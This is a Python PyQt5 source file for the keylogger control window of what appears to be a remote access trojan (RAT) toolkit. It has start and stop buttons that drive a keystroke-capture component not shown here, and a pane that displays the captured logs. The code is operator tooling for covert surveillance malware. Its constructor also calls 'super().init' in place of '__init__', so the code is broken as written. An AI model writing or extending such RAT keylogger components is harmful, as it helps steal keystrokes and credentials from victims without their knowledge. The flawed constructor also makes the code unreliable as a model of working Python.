import threading
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTextEdit, QPushButton
from RATFunction.RATFunctionUI import RATFunctionUI
from RATFunction.MyLogging import MyLogging

class KeyloggerUI(RATFunctionUI):
    def __init__(self, function: MyLogging, *args, **kwargs):
        super().init(function, *args, **kwargs)
        self.keylogger_function = function
        self.setWindowTitle('Keylogger')
        self.log_widget = QTextEdit()
        self.log_widget.setReadOnly(True)

        self.start_button = QPushButton('Start Keylogger', self)
        self.start_button.clicked.connect(self.start_keylogger)

        self.stop_button = QPushButton('Stop Keylogger', self)
        self.stop_button.clicked.connect(self.stop_keylogger)
        self.stop_button.setEnabled(False)

        layout = QVBoxLayout()
        layout.addWidget(self.log_widget)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        self.setLayout(layout)

    def start_keylogger(self):
        self.keylogger_function.start()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_keylogger(self):
        self.keylogger_function.stop()
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def update_logs(self, logs):
        self.log_widget.append(logs)

    def handle_close(self):
        self.keylogger_function.stop()
        super().handle_close()
